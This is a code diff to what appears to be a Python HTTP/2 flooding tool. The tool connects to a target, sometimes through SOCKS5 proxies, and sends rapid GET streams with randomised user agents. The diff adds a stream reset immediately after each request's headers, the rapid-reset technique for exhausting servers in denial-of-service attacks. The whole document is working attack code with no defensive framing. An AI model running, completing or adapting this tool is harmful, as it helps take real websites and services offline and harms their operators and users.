@@ -565,6 +565,7 @@ def main():
                             conn.initiate_connection()
                             s = ctx.wrap_socket(s , server_hostname=target)
                             s.connect((target , port))
+                            iur = "https"
                         else:
                             s = socksocket()
                             pri = che(sok5).split(':');
@@ -574,11 +575,12 @@ def main():
                             conn = H2Connection()
                             conn.initiate_connection()
                             s.connect((target , port))
+                            iur = "http"
                         for _ in range(rpc):
                             payl = {
                                 ":method": "GET",
                                 ":path": path,
-                                ":scheme": "https",
+                                ":scheme": iur,
                                 ":authority": target,
                                 "user-agent": ua.random,
                                 "accept-encoding": "gzip, deflate",
@@ -586,7 +588,9 @@ def main():
                             }
                             stream_id = conn.get_next_available_stream_id()
                             conn.send_headers(stream_id , payl)
-                            s.send(conn.data_to_send())
+                            s.sendall(conn.data_to_send())
+                            conn.reset_stream(stream_id)
+                            s.sendall(conn.data_to_send())
                     except:
                         pass
 
